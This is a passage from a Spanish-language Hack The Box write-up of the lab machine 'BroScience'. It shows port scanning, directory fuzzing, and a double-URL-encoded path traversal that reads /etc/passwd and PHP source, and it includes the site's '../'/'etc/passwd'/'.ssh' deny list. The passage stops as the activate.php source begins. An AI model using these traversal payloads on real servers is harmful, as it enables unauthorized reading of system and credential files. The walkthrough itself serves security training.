@@ -1,0 +1,784 @@
+<!doctype html><html lang="es"><head><title>BroScience | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web vulnerable a lectura de archivos locales que se puede usar para leer código PHP y encontrar una manera de activar una nueva cuenta. Luego, podemos usar un ataque de deserialización en PHP para obtener RCE. Después de eso, encontramos el hash de una contraseña en la base de datos que puede ser descifrada y reutilizada en el sistema. Finalmente, hay una tarea Cron ejecutada por root para renovar certificados de OpenSSL y el script presenta una vulnerabilidad de inyección de comandos, lo que conduce a la escalada de privilegios"><meta itemprop="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web vulnerable a lectura de archivos locales que se puede usar para leer código PHP y encontrar una manera de activar una nueva cuenta. Luego, podemos usar un ataque de deserialización en PHP para obtener RCE. Después de eso, encontramos el hash de una contraseña en la base de datos que puede ser descifrada y reutilizada en el sistema. Finalmente, hay una tarea Cron ejecutada por root para renovar certificados de OpenSSL y el script presenta una vulnerabilidad de inyección de comandos, lo que conduce a la escalada de privilegios"><meta name="twitter:card" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web vulnerable a lectura de archivos locales que se puede usar para leer código PHP y encontrar una manera de activar una nueva cuenta. Luego, podemos usar un ataque de deserialización en PHP para obtener RCE. Después de eso, encontramos el hash de una contraseña en la base de datos que puede ser descifrada y reutilizada en el sistema. Finalmente, hay una tarea Cron ejecutada por root para renovar certificados de OpenSSL y el script presenta una vulnerabilidad de inyección de comandos, lo que conduce a la escalada de privilegios"><meta name="twitter:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web vulnerable a lectura de archivos locales que se puede usar para leer código PHP y encontrar una manera de activar una nueva cuenta. Luego, podemos usar un ataque de deserialización en PHP para obtener RCE. Después de eso, encontramos el hash de una contraseña en la base de datos que puede ser descifrada y reutilizada en el sistema. Finalmente, hay una tarea Cron ejecutada por root para renovar certificados de OpenSSL y el script presenta una vulnerabilidad de inyección de comandos, lo que conduce a la escalada de privilegios"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene un sitio web vulnerable a lectura de archivos locales que se puede usar para leer código PHP y encontrar una manera de activar una nueva cuenta. Luego, podemos usar un ataque de deserialización en PHP para obtener RCE. Después de eso, encontramos el hash de una contraseña en la base de datos que puede ser descifrada y reutilizada en el sistema. Finalmente, hay una tarea Cron ejecutada por root para renovar certificados de OpenSSL y el script presenta una vulnerabilidad de inyección de comandos, lo que conduce a la escalada de privilegios"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/BroScience/BroScience.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/BroScience/BroScience.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/BroScience/BroScience.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="BroScience"><meta property="twitter:title" content="BroScience"><meta property="og:title" content="BroScience"><meta property="og:url" content="https://7rocky.github.io/htb/broscience/"><meta itemprop="keywords" content="php,cronjob,command-injection,insecure-deserialization,directory-path-traversal,static-code-analysis,lfr,password-reuse,rce,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/broscience/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/broscience/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/broscience/&amp;text=BroScience" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/htb/broscience/&amp;title=BroScience" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">BroScience</h1><time class="mt4 f6 dib tracked" datetime="2023-04-08T00:00:00+01:00">08 / 04 / 2023</time><br><p class="mb4 f6 dib tracked">19 minutos de lectura</p></header><div class="htb-image"><img alt="BroScience" src="/images/HTB/BroScience/BroScience.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/php" title="PHP">PHP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cronjob" title="Tareas Cron">Tareas Cron</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/command-injection" title="Inyección de Comandos">Inyección de Comandos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/insecure-deserialization" title="Deserialización insegura">Deserialización insegura</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/directory-path-traversal" title="Navegación de directorios">Navegación de directorios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/static-code-analysis" title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/lfr" title="Lectura de Archivos Locales">Lectura de Archivos Locales</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de <em>hashes</em> de contraseñas">Descifrado de <em>hashes</em> de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#análisis-de-código-fuente">Análisis de código fuente</a></li><li><a href="#activando-la-cuenta">Activando la cuenta</a></li><li><a href="#ataque-de-deserialización">Ataque de deserialización</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#inyección-de-comandos">Inyección de comandos</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.195</li><li><strong>Fecha</strong>: 07 / 01 / 2023</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.195 -p 22,80,443
+Nmap scan report for 10.10.11.195
+Host is up (0.12s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
+|_  256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
+80/tcp  open  http     Apache httpd 2.4.54
+|_http-title: Did not follow redirect to https://broscience.htb/
+|_http-server-header: Apache/2.4.54 (Debian)
+443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
+| Not valid before: 2022-07-14T19:48:36
+|_Not valid after:  2023-07-14T19:48:36
+Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 103.45 seconds
+</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS).</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.195</code>, se nos redirige a <code>https://broscience.htb</code>. Después de configurar el dominio en <code>/etc/hosts</code>, veremos esta página web:</p><p><img src="/images/HTB/BroScience/BroScience-1.png" alt="BroScience 1"></p><p>Muestra una lista de ejercicios de gimnasio. Podemos pinchar en alguno de ellos y ver que hay usuarios que publican comentarios:</p><p><img src="/images/HTB/BroScience/BroScience-2.png" alt="BroScience 2"></p><p><img src="/images/HTB/BroScience/BroScience-3.png" alt="BroScience 3"></p><p>También hay un formulario de inicio de sesión:</p><p><img src="/images/HTB/BroScience/BroScience-4.png" alt="BroScience 4"></p><p>Y también un formulario de registro:</p><p><img src="/images/HTB/BroScience/BroScience-5.png" alt="BroScience 5"></p><p>Pero si intentamos registrarnos, nuestra cuenta no será activada porque no tenemos el código de activación:</p><p><img src="/images/HTB/BroScience/BroScience-6.png" alt="BroScience 6"></p><p>Hay una manera de enumerar usuarios en <code>/user.php? Id =</code>. Nuestro nuevo usuario tiene ID <code>7</code>:</p><p><img src="/images/HTB/BroScience/BroScience-7.png" alt="BroScience 7"></p><p>Apliquemos <em>fuzzing</em> para enumerar más rutas del sitio web:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u https://broscience.htb/FUZZ -r -e .php  
+<span class="code-dark-green">index.php               [Status: 200, Size: 9308, Words: 3953, Lines: 147, Duration: 107ms]</span>
+<span class="code-dark-green">images                  [Status: 200, Size: 2456, Words: 127, Lines: 24, Duration: 80ms]</span>
+<span class="code-dark-green">login.php               [Status: 200, Size: 1936, Words: 567, Lines: 42, Duration: 112ms]</span>
+<span class="code-dark-green">register.php            [Status: 200, Size: 2161, Words: 635, Lines: 45, Duration: 101ms]</span>
+<span class="code-dark-green">user.php                [Status: 200, Size: 1309, Words: 300, Lines: 29, Duration: 68ms]</span>
+<span class="code-dark-green">comment.php             [Status: 200, Size: 1936, Words: 567, Lines: 42, Duration: 88ms]</span>
+<span class="code-dark-green">includes                [Status: 200, Size: 1753, Words: 115, Lines: 21, Duration: 149ms]</span>
+<span class="code-dark-green">manual                  [Status: 200, Size: 676, Words: 15, Lines: 14, Duration: 307ms]</span>
+<span class="code-dark-yellow">javascript              [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 327ms]</span>
+<span class="code-dark-green">logout.php              [Status: 200, Size: 9308, Words: 3953, Lines: 147, Duration: 85ms]</span>
+<span class="code-dark-green">styles                  [Status: 200, Size: 1134, Words: 74, Lines: 18, Duration: 52ms]</span>
+<span class="code-dark-green">activate.php            [Status: 200, Size: 1256, Words: 293, Lines: 28, Duration: 381ms]</span>
+<span class="code-dark-green">exercise.php            [Status: 200, Size: 1322, Words: 301, Lines: 28, Duration: 403ms]</span>
+<span class="code-dark-yellow">.php                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 102ms]</span>
+<span class="code-dark-green">                        [Status: 200, Size: 9308, Words: 3953, Lines: 147, Duration: 224ms]</span>
+<span class="code-dark-yellow">server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 77ms]</span>
+</code></pre></div><p>Si vamos a <code>/includes</code>, veremos algunos archivos PHP (el listado de directorios está habilitado), pero el código PHP no se muestra:</p><p><img src="/images/HTB/BroScience/BroScience-8.png" alt="BroScience 8"></p><p>Si echamos un vistazo al código fuente HTML, notaremos algo extraño en la forma en que se cargan las imágenes:</p><p><img src="/images/HTB/BroScience/BroScience-9.png" alt="BroScience 9"></p><p><img src="/images/HTB/BroScience/BroScience-10.png" alt="BroScience 10"></p><p>Ese parámetro llamado <code>path</code> es sospechoso&mldr; Probablemente sea vulnerable a algún tipo de lectura local de archivos o vulnerabilidad de inclusión de archivos locales.</p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Si probamos un ataque de navegación de directorios básico, el servidor nos caza:</p><p><img src="/images/HTB/BroScience/BroScience-11.png" alt="BroScience 11"></p><p>Incluso con codificación URL:</p><p><img src="/images/HTB/BroScience/BroScience-12.png" alt="BroScience 12"></p><p>Sin embargo, usando doble codificación URL, el servidor ya no se queja:</p><p><img src="/images/HTB/BroScience/BroScience-13.png" alt="BroScience 13"></p><p>Entonces ahora podemos leer archivos del servidor. Como el código PHP no se ejecuta, estamos ante una vulnerabilidad local de lectura de archivos (<em>Local File Read</em>).</p><h3 id="análisis-de-código-fuente">Análisis de código fuente</h3><p>Esto es <code>include/img.php</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k <span class="code-dark-yellow">'https://broscience.htb/includes/img.php?path=%252e%252e/includes/img.php'</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+<span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk7">isset</span><span class="mtk1">($_GET[</span><span class="mtk4">'path'</span><span class="mtk1">])) {</span>
+<span class="mtk1">    </span><span class="mtk5">die</span><span class="mtk1">(</span><span class="mtk4">'&lt;b&gt;Error:&lt;/b&gt; Missing </span><span class="mtk6">\'</span><span class="mtk4">path</span><span class="mtk6">\'</span><span class="mtk4"> parameter.'</span><span class="mtk1">);</span>  
+<span class="mtk1">}</span>
+
+<span class="mtk3">// Check for LFI attacks</span>
+<span class="mtk1">$path </span><span class="mtk5">=</span><span class="mtk1"> $_GET[</span><span class="mtk4">'path'</span><span class="mtk1">];</span>
+
+<span class="mtk1">$badwords </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">array</span><span class="mtk1">(</span><span class="mtk4">"../"</span><span class="mtk1">, </span><span class="mtk4">"etc/passwd"</span><span class="mtk1">, </span><span class="mtk4">".ssh"</span><span class="mtk1">);</span>
+<span class="mtk5">foreach</span><span class="mtk1"> ($badwords </span><span class="mtk5">as</span><span class="mtk1"> $badword) {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">strpos</span><span class="mtk1">($path, $badword) </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk5">die</span><span class="mtk1">(</span><span class="mtk4">'&lt;b&gt;Error:&lt;/b&gt; Attack detected.'</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+
+<span class="mtk3">// Normalize path</span>
+<span class="mtk1">$path </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">urldecode</span><span class="mtk1">($path);</span>
+
+<span class="mtk3">// Return the image</span>
+<span class="mtk7">header</span><span class="mtk1">(</span><span class="mtk4">'Content-Type: image/png'</span><span class="mtk1">);</span>
+<span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk7">file_get_contents</span><span class="mtk1">(</span><span class="mtk4">'/var/www/html/images/'</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> $path);</span>
+<span class="mtk5">?</span><span class="mtk5">&gt;</span>
+</code></pre></div><p>Aquí vemos que no se permiten algunas palabras, pero el uso de <code>urldecode</code> nos permite codificar la ruta en doble codificación URL y evitar ese filtro. Esto es <code>/etc/passwd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k <span class="code-dark-yellow">'https://broscience.htb/includes/img.php?path=%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc%252fpasswd'</span>  
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
+sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
+Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+</code></pre></div><p>Para activar nuestra cuenta, podemos echar un vistazo a <code>activate.php</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k <span class="code-dark-yellow">'https://broscience.htb/includes/img.php?path=%252e%252e/activate.php'</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+<span class="mtk7">session_start</span><span class="mtk1">();</span>
+
+<span class="mtk3">// Check if user is logged in already</span>
